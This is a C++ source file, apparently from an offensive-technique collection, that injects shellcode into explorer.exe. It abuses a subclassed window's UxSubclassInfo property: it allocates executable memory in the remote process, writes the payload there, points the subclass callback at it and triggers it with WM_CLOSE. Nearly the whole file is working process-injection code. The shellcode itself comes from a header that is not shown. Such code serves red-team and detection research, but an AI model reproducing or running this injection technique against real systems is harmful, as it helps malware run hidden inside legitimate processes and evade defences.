/**
* Injects shellcode into explorer.exe abusing a subclassed window.
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation causes the process crash after executing the shellcode because it does not match the SUBCLASSPROC signature
* [Requirements]
*	- target process must have a subclassed window
* Based on: https://modexp.wordpress.com/2018/08/23/process-injection-propagate/
*/


#include <windows.h>
#include <stdio.h>

#include "../payload/shellcode.hpp"

typedef LRESULT(CALLBACK* SUBCLASSPROC)(
	HWND      hWnd,
	UINT      uMsg,
	WPARAM    wParam,
	LPARAM    lParam,
	UINT_PTR  uIdSubclass,
	DWORD_PTR dwRefData
);

typedef struct _SUBCLASS_CALL {
	SUBCLASSPROC pfnSubclass;    // subclass procedure
	WPARAM       uIdSubclass;    // unique subclass identifier
	DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
	UINT                    uCallIndex;   // index of next callback to call
	UINT                    uDeepestCall; // deepest uCallIndex on stack
	struct _SUBCLASS_FRAME* pFramePrev;  // previous subclass frame pointer
	struct _SUBCLASS_HEADER* pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
	UINT           uRefs;        // subclass count
	UINT           uAlloc;       // allocated subclass call nodes
	UINT           uCleanup;     // index of call node to clean up
	DWORD          dwThreadId;   // thread id of window we are hooking
	SUBCLASS_FRAME* pFrameCur;   // current subclass frame pointer
	SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, * PSUBCLASS_HEADER;


HWND shellDllDefViewWindowHandle = nullptr;


// credits: https://stackoverflow.com/questions/36566675/winapi-how-to-obtain-shelldll-defview
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) 
{
	HWND currentWindowHandle = FindWindowExA(hwnd, 0, "SHELLDLL_DefView", 0);
	if (currentWindowHandle) 
	{
		// keep enumerating if the current window handle has more than 1 child
		if (GetNextWindow(currentWindowHandle, GW_HWNDNEXT) || GetNextWindow(currentWindowHandle, GW_HWNDPREV))
		{
			return true;
		}
		
		shellDllDefViewWindowHandle = currentWindowHandle;
		return false;
	}
	return true;
}

bool Propagate(LPVOID payload, DWORD payloadSize)
{
	EnumWindows(&EnumWindowsProc, 0);

	if (!shellDllDefViewWindowHandle)
	{
		printf("[Error] - Failed to find ShellDll_DefView window handle\n");
		return false;
	}

	printf("[Info] - Found ShellDll_DefView window handle\n");

	HANDLE propHandle = GetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo");
	if (!propHandle)
	{
		printf("[Error] - Failed to get a handle to UxSubclassInfo using GetPropA\n");
		return false;
	}

	printf("[Info] - Found UxSubclassInfo\n");

	DWORD processId;
	if (!GetWindowThreadProcessId(shellDllDefViewWindowHandle, &processId))
	{
		printf("[Error] - Failed GetWindowThreadProcessId\n");
		return false;
	}

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (!processHandle)
	{
		printf("[Error] %d - Failed to OpenProcess explorer.exe\n", GetLastError());
		return false;
	}

	printf("[Info] - Acquired handle to explorer.exe\n");

	SUBCLASS_HEADER subclassHeader;
	SIZE_T numberOfBytesRead;
	if (!ReadProcessMemory(processHandle, (LPVOID)propHandle, &subclassHeader, sizeof(subclassHeader), &numberOfBytesRead))
	{
		printf("[Error] %d - Failed to read subclass header (ReadProcessMemory)\n", GetLastError());
		return false;
	}

	LPVOID remoteSubclassHeaderBuffer = VirtualAllocEx(processHandle, NULL, sizeof(subclassHeader), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteSubclassHeaderBuffer)
	{
		printf("[Error] %d - Failed to allocate remote memory for subclass header (VirtualAllocEx)\n", GetLastError());
		return false;
	}

	LPVOID remoteSubclassBuffer = VirtualAllocEx(processHandle, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteSubclassBuffer)
	{
		printf("[Error] %d - Failed to allocate remote memory for subclass (VirtualAllocEx)\n", GetLastError());
		return false;
	}

	SIZE_T numberOfbytesWritten;
	if (!WriteProcessMemory(processHandle, remoteSubclassBuffer, payload, payloadSize, &numberOfbytesWritten))
	{
		printf("[Error] %d - Failed to write payload into remote subclass (WriteProcessMemory)\n", GetLastError());
		return false;
	}

	// set subclass procedure to payload
	subclassHeader.CallArray[0].pfnSubclass = (SUBCLASSPROC)remoteSubclassBuffer;

	if(!WriteProcessMemory(processHandle, remoteSubclassHeaderBuffer, &subclassHeader, sizeof(subclassHeader), &numberOfbytesWritten))
	{
		printf("[Error] %d - Failed to write updated subclass header into remote process (WriteProcessMemory)\n", GetLastError());
		return false;
	}

	printf("[Info] - Wrote payload and payload header into subclass\n");

	if (!SetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo", remoteSubclassHeaderBuffer))
	{
		printf("[Error] %d - Failed to change UxSubclassInfo to the new subclass header using SetProp\n", GetLastError());
		return false;
	}

	printf("[Info] - Updated UxSubclassInfo to new subclass header\n");

	SendMessageA(shellDllDefViewWindowHandle, WM_CLOSE, 0, 0);

	printf("[Info] - Executed payload by send a WM_CLOSE message to the window\n");

	if (!SetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo", propHandle))
	{
		printf("[Error] %d - Failed to restore subclass header using SetPropA\n", GetLastError());
		return false;
	}

	printf("[Info] - Restored original subclass header\n");

	// cleanup
	VirtualFreeEx(processHandle, remoteSubclassHeaderBuffer, 0, MEM_RELEASE);
	VirtualFreeEx(processHandle, remoteSubclassBuffer, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	return true;
}

int main(int argc, char* argv[])
{
	if (!Propagate(shellcode, sizeof(shellcode)))
	{
		printf("[Error] - Failed to propagate\n");
		return 1;
	}

	return 0;
}